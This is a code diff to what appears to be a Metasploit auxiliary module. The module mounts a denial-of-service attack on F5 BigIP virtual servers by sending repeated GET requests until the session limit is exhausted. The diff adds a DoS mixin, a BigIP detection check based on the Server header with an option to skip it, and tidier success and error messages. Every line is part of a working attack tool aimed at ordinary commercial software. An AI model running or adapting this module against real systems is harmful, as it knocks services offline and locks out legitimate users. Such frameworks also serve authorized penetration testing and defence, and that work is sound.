@@ -7,6 +7,7 @@ require 'msf/core'
 
 class Metasploit3 < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
+  include Msf::Auxiliary::Dos
 
   def initialize(info = {})
     super(update_info(info,
@@ -40,7 +41,8 @@ class Metasploit3 < Msf::Auxiliary
       [
         OptPort.new('RPORT', [true, 'The BigIP service port to listen on', 443]),
         OptBool.new('SSL', [true, "Negotiate SSL for outgoing connections", true]),
-        OptInt.new('RLIMIT', [true, 'The number of requests to send', 10000])
+        OptInt.new('RLIMIT', [true, 'The number of requests to send', 10000]),
+        OptBool.new('IGNOREMISMATCH', [true, 'Proceed with attack only if BigIP virtual server was detected', false]),
       ], self.class)
   end
 
@@ -48,13 +50,22 @@ class Metasploit3 < Msf::Auxiliary
     # Main function
     rlimit = datastore['RLIMIT']
     proto = datastore['SSL'] ? 'https' : 'http'
+    ignore_mismatch = datastore['IGNOREMISMATCH']
 
     # Send an initial test request
     res = send_request_cgi('method' => 'GET', 'uri' => '/')
     if res
-      print_status("#{peer} - Starting DoS attack")
+      server = res.headers['Server']
+      # Simple test based on HTTP Server header to detect BigIP virtual server
+      unless ignore_mismatch
+        if server !~ /BIG\-IP/ && server !~ /BigIP/
+          print_error("#{peer} - BigIP virtual server was not detected. Please check options")
+          return
+        end
+      end
+      print_good("#{peer} - Starting DoS attack")
     else
-      print_error("#{proto}://#{rhost}:#{rport} - Unable to connect to BIgIP. Please check options")
+      print_error("#{peer} - Unable to connect to BigIP. Please check options")
       return
     end
 
@@ -62,8 +73,8 @@ class Metasploit3 < Msf::Auxiliary
     (1..rlimit).each do
       res = send_request_cgi('method' => 'GET', 'uri' => '/')
       if res && res.headers['Location'] == '/my.logout.php3?errorcode=14'
-        print_status("#{peer} - The maximum number of concurrent user sessions has been reached. No new user sessions can start at this time")
-        print_status("#{peer} - DoS attack is successful")
+        print_good("#{peer} - The maximum number of concurrent user sessions has been reached. No new user sessions can start at this time")
+        print_good("#{peer} - DoS attack is successful")
         return
       end
     end
@@ -77,9 +88,9 @@ class Metasploit3 < Msf::Auxiliary
     end
 
     rescue ::Rex::ConnectionRefused
-      print_error("#{proto}://#{rhost}:#{rport} - Unable to connect to BigIP")
+      print_error("#{peer} - Unable to connect to BigIP")
     rescue ::Rex::ConnectionTimeout
-      print_error("#{proto}://#{rhost}:#{rport} - Unable to connect to BigIP. Please check options")
+      print_error("#{peer} - Unable to connect to BigIP. Please check options")
     rescue ::Errno::ECONNRESET
       print_error("#{peer} - The connection was reset. Probably BigIP \"Max In Progress Sessions Per Client IP\" counter was reached")
       print_status("#{peer} - DoS attack is unsuccessful")
